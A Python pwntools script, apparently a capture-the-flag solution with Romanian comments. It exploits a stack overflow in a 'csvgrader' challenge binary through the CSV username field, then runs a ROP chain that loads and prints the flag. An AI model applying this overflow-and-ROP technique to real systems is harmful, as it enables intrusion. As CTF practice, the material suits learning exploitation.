#!/usr/bin/env python3
from pwn import *

# Setari de baza pentru binar
binary_name = "./csvgrader"
context.binary = elf = ELF(binary_name)
context.terminal = ["tmux", "splitw", "-h"]

# Date pentru serverul remote
REMOTE_HOST = "isc2025.root.sx"
REMOTE_PORT = 12036

# Offset-ul gasit cand am produs overflow-ul
OFFSET = 62

def make_payload(raw_bytes: bytes):
    # sscanf se opreste la virgula, deci payload-ul ajunge in campul username
    # adaug restul liniei ca sa arate ca o intrare CSV valida
    return raw_bytes + b",MateriaMea,10\n"

def exploit():
    # Aleg daca rulez local sau remote
    if args.REMOTE:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = elf.process()

    # =========================================================
    # Construirea ROP chain-ului
    # =========================================================
    # Obiectiv: pac_pac(0xb659308) si apoi puts(fl00g)

    rop = ROP(elf)

    # Apelez functia care incarca flag-ul in memorie
    rop.pac_pac(0xb659308)

    # Incerc sa iau adresa variabilei globale fl00g
    try:
        addr_fl00g = elf.symbols["fl00g"]
    except KeyError:
        # Daca nu se gaseste automat, trebuie verificata manual in Ghidra
        log.error("Nu am gasit simbolul fl00g. Verifica manual adresa in Ghidra.")
        return

    # Afisez fl00g cu puts
    rop.puts(addr_fl00g)

    # Exit optional pentru iesire curata
    rop.exit(0)

    log.info(rop.dump())

    # Payload final: padding + ROP chain
    payload = flat(
        b"A" * OFFSET,
        rop.chain()
    )

    # Trimit exploit-ul
    io.send(make_payload(payload))

    # Citesc tot ce trimite serverul
    io.stream()

if __name__ == "__main__":
    exploit()

